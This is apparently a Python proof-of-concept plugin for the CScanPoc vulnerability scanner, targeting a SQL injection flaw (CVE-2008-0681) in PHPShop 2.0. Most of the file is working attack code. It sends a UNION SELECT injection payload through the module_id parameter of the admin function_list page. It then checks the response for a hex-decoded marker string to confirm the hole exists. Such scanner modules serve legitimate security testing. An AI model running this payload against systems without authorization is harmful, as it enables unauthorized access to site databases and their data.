# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PHPShop_0001'  # 平台漏洞编号
    name = 'phpShop 2.0 - SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-01-14'  # 漏洞公布时间
    desc = '''
        phpshop购物系统是完全按照web2.0标准构架的一套完整、专业的购物系统，完善的使用功能足以满足专业购物网站的需求，在用户体验方面使用了ajax技术，让网站耳目一新。程序基于PHP5.0和MYSQL5.0，运行更快，更安全。
        PHPShop ?page=admin/function_list&module_id=11 id变量未正确过滤,导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/24108/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2008-0681'  # cve编号
    product = 'PHPShop'  # 漏洞组件名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5db9b138-a68a-4576-9d6f-541166fa36f0'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            target_url = "/phpshop 2.0/?page=admin/function_list&module_id=11' union select 1,CONCAT(0x7162787671,0x50664e68584e4c584352,0x716a717171),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 --"
            response = requests.get(arg + target_url, timeout=10)
            content = response.text
            match = re.search('qbxvqPfNhXNLXCRqjqqq', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
